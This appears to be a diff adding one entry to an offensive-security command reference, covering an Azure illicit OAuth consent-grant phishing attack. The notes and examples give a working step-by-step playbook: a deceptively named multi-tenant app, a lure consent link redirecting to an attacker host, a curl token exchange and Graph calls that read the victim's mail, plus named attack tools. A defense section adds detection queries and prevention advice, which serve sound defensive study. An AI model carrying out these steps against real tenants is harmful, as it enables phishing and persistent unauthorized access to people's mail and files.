@@ -1,0 +1,104 @@
+{
+  "id": "azure-illicit-consent-grant",
+  "name": "Azure Illicit Consent Grant - OAuth App Phishing",
+  "command": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<client_id>&response_type=code&scope=<scope>",
+  "description": "Register a multi-tenant Entra application and trick a victim into granting it delegated Microsoft Graph permissions (Mail.Read, Files.Read.All, offline_access, etc.) via the real OAuth consent screen. Once consented, the attacker's app holds a refresh token and persistent delegated access to the victim's mailbox/files - independent of the victim's password and surviving password resets.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Cloud Security",
+  "subcategory": "Azure Attacks",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "Microsoft Security / o365blog",
+  "tags": [
+    "azure",
+    "entra-id",
+    "oauth",
+    "consent-phishing",
+    "illicit-consent",
+    "graph",
+    "persistence"
+  ],
+  "mitre": [
+    "T1528",
+    "T1098.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\n  You don't steal a password. You get the victim to consent to YOUR app,\n  which then has a refresh token for the scopes they approved. Access\n  persists until an admin revokes the grant / disables the app.\n\n=== STEP 1: REGISTER A MULTI-TENANT APP ===\n  az ad app create --display-name \"HR Portal\" \\\n    --sign-in-audience AzureADMultipleOrgs \\\n    --web-redirect-uris https://<attacker_host>/callback\n  # add delegated Graph permissions: Mail.Read, Files.Read.All, offline_access\n  az ad app permission add --id <app_id> \\\n    --api 00000003-0000-0000-c000-000000000000 \\\n    --api-permissions <permission_guid>=Scope\n\n=== STEP 2: SEND THE CONSENT LINK (lure) ===\n  https://login.microsoftonline.com/common/oauth2/v2.0/authorize?\n    client_id=<client_id>&response_type=code\n    &redirect_uri=https://<attacker_host>/callback\n    &scope=offline_access%20Mail.Read%20Files.Read.All\n    &state=1\n  # victim clicks, sees the real Microsoft consent page, clicks Accept\n\n=== STEP 3: EXCHANGE CODE FOR TOKENS (attacker callback) ===\n  curl -X POST 'https://login.microsoftonline.com/common/oauth2/v2.0/token' \\\n    -d 'client_id=<client_id>' -d 'client_secret=<secret>' \\\n    -d 'grant_type=authorization_code' -d 'code=<code>' \\\n    -d 'redirect_uri=https://<attacker_host>/callback'\n  # returns access_token + refresh_token for the consented scopes\n\n=== STEP 4: USE DELEGATED GRAPH ACCESS ===\n  curl -H \"Authorization: Bearer <access_token>\" \\\n    https://graph.microsoft.com/v1.0/me/messages\n\n=== TOOLING ===\n  o365-attack-toolkit, GraphRunner (Invoke-InjectOAuthApp), 365-Stealer.",
+  "examples": [
+    {
+      "label": "Register a multi-tenant app",
+      "command": "az ad app create --display-name 'HR Portal' --sign-in-audience AzureADMultipleOrgs --web-redirect-uris https://<url>/callback"
+    },
+    {
+      "label": "Consent URL (lure)",
+      "command": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<client_id>&response_type=code&redirect_uri=https://<url>/callback&scope=offline_access%20Mail.Read"
+    },
+    {
+      "label": "Read victim mail with the token",
+      "command": "curl -H 'Authorization: Bearer <token>' https://graph.microsoft.com/v1.0/me/messages"
+    }
+  ],
+  "references": [
+    {
+      "title": "Microsoft - Illicit consent grant attack",
+      "url": "https://learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-illicit-consent-grants"
+    },
+    {
+      "title": "o365blog - OAuth consent phishing",
+      "url": "https://aadinternals.com/post/phishing/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cloud-graphrunner",
+      "note": "GraphRunner injects malicious OAuth apps and uses the tokens.",
+      "rel": "next"
+    },
+    {
+      "id": "azure-device-code-phishing",
+      "note": "Alternative token-phishing technique.",
+      "rel": "alternative"
+    },
+    {
+      "id": "cloud-aadinternals",
+      "note": "Post-consent Entra/Graph post-exploitation.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "User consent to third-party OAuth apps is a supported feature. If the tenant allows users to consent to apps (or consent is phished from an admin), a victim can grant a rogue multi-tenant app delegated Graph scopes, giving the attacker a refresh token and standing access independent of the password.",
+    "prerequisites": "A registered multi-tenant Entra app with a secret and a redirect URI, requested delegated scopes, and a victim who clicks Accept on the consent screen (or an admin who grants tenant-wide consent).",
+    "impact": "Persistent delegated access to the victim's mail, files, and other Graph data; the refresh token survives password resets, so remediation requires revoking the grant and the app - true persistence.",
+    "detection": "[MITRE T1098.003] Entra audit log 'Consent to application' / 'Add OAuth2PermissionGrant' / 'Add app role assignment' events, especially for unfamiliar multi-tenant apps requesting sensitive scopes (Mail.Read, Files.Read.All, offline_access).",
+    "artifacts": "Entra AuditLogs operations 'Consent to application' and 'Add delegated permission grant'; ServicePrincipal and OAuth2PermissionGrant objects for the rogue app; Graph API access from the app's service principal.",
+    "splunk_spl": "index=azure sourcetype=azure:aad:audit (operationName=\"Consent to application\" OR operationName=\"Add OAuth2PermissionGrant\" OR operationName=\"Add delegated permission grant to*\")\n| stats count by initiatedBy.user.userPrincipalName, targetResources{}.displayName",
+    "elastic_kql": "azure.auditlogs.operation_name:(\"Consent to application\" or \"Add OAuth2PermissionGrant\")",
+    "sentinel_kql": "AuditLogs\n| where OperationName in (\"Consent to application\",\"Add OAuth2PermissionGrant\",\"Add delegated permission grant to service principal\")\n| project TimeGenerated, InitiatedBy, OperationName, TargetResources",
+    "sigma_rules": "azure_illicit_oauth_consent_grant",
+    "prevention": "Disable user consent to apps and require admin consent (with an admin-consent request workflow); restrict consent to verified publishers and low-risk scopes; enable Entra app consent policies; review enterprise-app consent grants regularly; alert on new OAuth grants for sensitive scopes.",
+    "sources": [
+      "https://learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-illicit-consent-grants",
+      "https://aadinternals.com/post/phishing/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Illicit OAuth consent grant for sensitive scopes",
+        "logic": "AuditLogs\n| where OperationName in (\"Consent to application\",\"Add OAuth2PermissionGrant\",\"Add delegated permission grant to service principal\")\n| mv-expand TargetResources\n| extend App=tostring(TargetResources.displayName)\n| project TimeGenerated, InitiatedBy, OperationName, App",
+        "data_source": "entra-id",
+        "attack": [
+          "T1528",
+          "T1098.003"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate onboarding of new SaaS/line-of-business apps",
+        "tuning": "Allowlist approved publishers/apps; alert on consent to multi-tenant apps requesting Mail/Files/offline_access scopes"
+      }
+    ]
+  }
+}
